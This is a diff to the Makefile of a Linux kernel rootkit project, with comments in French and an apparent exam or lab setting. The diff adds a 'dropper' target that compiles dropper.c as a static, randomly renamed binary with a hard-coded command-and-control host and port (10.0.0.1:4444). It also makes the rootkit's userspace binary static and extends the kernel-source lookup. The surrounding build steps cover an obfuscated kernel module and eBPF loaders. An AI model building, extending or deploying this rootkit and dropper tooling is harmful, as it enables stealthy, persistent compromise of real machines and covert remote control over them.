@@ -4,15 +4,15 @@ rk-objs := rootkit.o obfs.o
 # Kernel version: use .target_kver if present, else running kernel
 KVER ?= $(shell cat .target_kver 2>/dev/null || uname -r)
 
-# KDIR: prefer local build-sys-linux-<KVER> if present (exam env), else /lib/modules
-BUILDSYS := $(wildcard $(PWD)/../build-sys-linux-$(KVER))
+PWD  := $(shell pwd)
+
+# KDIR: cherche build-sys-linux-<KVER> puis linux-<KVER>, sinon /lib/modules
+BUILDSYS := $(or $(wildcard $(PWD)/../build-sys-linux-$(KVER)),$(wildcard $(PWD)/../linux-$(KVER)))
 ifeq ($(BUILDSYS),)
 KDIR := /lib/modules/$(KVER)/build
 else
 KDIR := $(BUILDSYS)
 endif
-
-PWD  := $(shell pwd)
 
 # eBPF
 CLANG      := clang
@@ -40,7 +40,7 @@ modules: gen_name _build_module _rename
 
 userspace: gen_name
 	$(eval BIN_NAME := $(shell ./gen_name))
-	gcc -Wall -Wextra -I$(PWD) -o $(BIN_NAME) core.c
+	gcc -Wall -Wextra -static -I$(PWD) -o $(BIN_NAME) core.c
 	echo "$(BIN_NAME)" > .rk_bin_name
 	@echo "[+] binaire renommé : $(BIN_NAME)"
 
@@ -52,10 +52,20 @@ $(BPF_DIR)/%.bpf.o: $(BPF_DIR)/%.bpf.c $(BPF_DIR)/vmlinux.h $(BPF_DIR)/rk_bpf_co
 ebpf_loader:
 	gcc -Wall -Wextra -I$(BPF_DIR) -o $(BPF_DIR)/rk_ebpf_loader $(BPF_DIR)/rk_ebpf_loader.c -lbpf -lelf -lz
 
+dropper: gen_name
+	$(eval C2_HOST ?= 10.0.0.1)
+	$(eval C2_PORT ?= 4444)
+	$(eval DRP_NAME := $(shell ./gen_name))
+	gcc -Wall -Wextra -O2 -static -o $(DRP_NAME) dropper.c obfs.c \
+		-DC2_HOST='"$(C2_HOST)"' -DC2_PORT=$(C2_PORT)
+	echo "$(DRP_NAME)" > .rk_dropper_name
+	@echo "[+] dropper compilé : $(DRP_NAME) (C2=$(C2_HOST):$(C2_PORT))"
+
 clean:
 	make -C $(KDIR) M=$(PWD) clean
 	rm -f rootkit_malware $(shell cat .rk_bin_name 2>/dev/null)
-	rm -f .rk_bin_name .rk_name gen_name
+	rm -f $(shell cat .rk_dropper_name 2>/dev/null)
+	rm -f .rk_bin_name .rk_name .rk_dropper_name gen_name
 	rm -f $(BPF_DIR)/*.bpf.o $(BPF_DIR)/rk_ebpf_loader
 
 .PHONY: all modules gen_name _build_module _rename userspace ebpf ebpf_loader dropper clean
